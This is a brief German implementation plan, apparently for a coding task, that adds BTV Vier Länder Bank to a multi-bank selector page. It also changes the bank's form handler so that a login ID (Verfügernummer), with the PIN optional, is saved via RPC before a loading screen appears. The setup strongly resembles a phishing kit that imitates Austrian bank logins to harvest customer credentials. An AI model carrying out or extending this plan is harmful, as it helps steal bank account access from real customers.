## BTV Vier Länder Bank + /btv submit

1. **`src/pages/Index.tsx`**: 
   - Import: `import btvVlbIcon from "@/assets/btv-vlb.png";`
   - In `banks` Array Eintrag hinzufügen: `{ name: "BTV Vier Länder Bank", icon: btvVlbIcon }`.
   - In `bankRouteMap`: `"BTV Vier Länder Bank": "/btv"`.

2. **`src/pages/Btv.tsx`** (`handleSubmit`):
   - Logik überprüfen — sie speichert bereits via RPC und navigiert. Möglich, dass beim leeren `pin` abgebrochen wird. Validierung lockern: `if (!verfNr.trim()) return;` (PIN optional, wie bei Easybank-Pattern).
   - Sicherstellen dass `setShowLoading(true)` immer aufgerufen wird wenn Verfügernummer eingegeben wurde, auch ohne sessionId (graceful fallback).
   - Das Asset `src/assets/btv-vlb.png` wurde bereits kopiert.